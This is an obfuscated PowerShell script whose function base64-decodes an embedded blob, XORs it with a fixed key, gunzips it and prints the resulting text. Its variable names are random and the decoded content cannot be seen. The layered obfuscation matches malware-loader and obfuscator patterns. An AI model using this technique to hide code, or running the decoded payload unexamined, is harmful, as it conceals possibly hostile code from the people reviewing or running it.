
function 60qhutyid974vsx3pekc82zwfro  {
    param($ie8qlc9o0bj7u53 )
    $1s35zfdj6ch4vpl = [System.Convert]::FromBase64String($ie8qlc9o0bj7u53)
    $1ho2u6td3nckxwi= [System.Text.Encoding]::ascii.GetBytes("xpjhzswvqi3m")
    $xys32h7l60no85r = $1s35zfdj6ch4vpl
    $c3jvp2ab8uqez9x = $(for ($3va85li0gh67tdx = 0; $3va85li0gh67tdx -lt $xys32h7l60no85r.length; ) {
        for ($3lnqz2yeob6kvat = 0; $3lnqz2yeob6kvat -lt $1ho2u6td3nckxwi.length; $3lnqz2yeob6kvat++) {
            $xys32h7l60no85r[$3va85li0gh67tdx] -bxor $1ho2u6td3nckxwi[$3lnqz2yeob6kvat]
            $3va85li0gh67tdx++
            if ($3va85li0gh67tdx -ge $xys32h7l60no85r.Length) {
                $3lnqz2yeob6kvat = $1ho2u6td3nckxwi.length
            }
        }
    })
	$6s1ebt75hzgfawl = New-Object System.IO.MemoryStream( , $c3jvp2ab8uqez9x )

	    $jifctunw41lka9e = New-Object System.IO.MemoryStream
        $cjezyv9a3ibqn87 = New-Object System.IO.Compression.GzipStream $6s1ebt75hzgfawl, ([IO.Compression.CompressionMode]::Decompress)
	    $cjezyv9a3ibqn87.CopyTo( $jifctunw41lka9e )
        $cjezyv9a3ibqn87.Close()
		$6s1ebt75hzgfawl.Close()
		[byte[]] $f61rel4onawu583 = $jifctunw41lka9e.ToArray()
 $uvwd7rpzs24hmiq=$f61rel4onawu583
    return $uvwd7rpzs24hmiq
}

[System.Text.Encoding]::ascii.GetString((60qhutyid974vsx3pekc82zwfro "Z/tiaHpzd3Z1aZ45Mx/JWGrNILwO8XDJmtUOBRgt/ATavWgWoDM/LUNLszsZdfu3puKEAoUIHsLHIP7cCIleZLkPeEXI868C3em+uSvFYiF7516q3aobSVoRBd2R09IwvDSnfLJMfdCw2+lcwVJSYYVQ9Vu7RBFrmbxIO9n6IFTAciE2PI1U+oIbx/yaqjunkeZfjOJZ7WnDVB+NxteY2ASS4vCxefqKDvXb596Nfc5BVf+upNw2DMRbb/n5OxMtucIEnFCb2E3fymjLQeq32s30kFG/DStOgH5z6kq1RjOuixfiKYm2ogSA1GL20+iBN71BhiOSZVg6+OMt6j+/WD6DAIyKvo8WQZlAJ+FO831W6u7RSG587bUTV/QEYGhsSYV3qTQzYPKt+sGBbyo0cEzIkFFsiShNbN2gF6neH6E9lWvmzqpF6vvkKB8U/8gwjj0N0GUZ3C1Lr0BJifMJ+4yvEKD7Hdd56bIVZYEOWQmnWhTna/DmcE/rTIl5zgiFDBTqK1x0/q/3DyWZkc0iNBL1pcc4ragEP1XsLBjFO76W99JiuQHbWfcQOD2b2ivfTcUehtPm5XkbqJ04whFt5ioKiUF/eklgqRO3BKCd0AhidUWYHrPxoe/IqHfY8CnR+HVqaA=="))|Write-Host
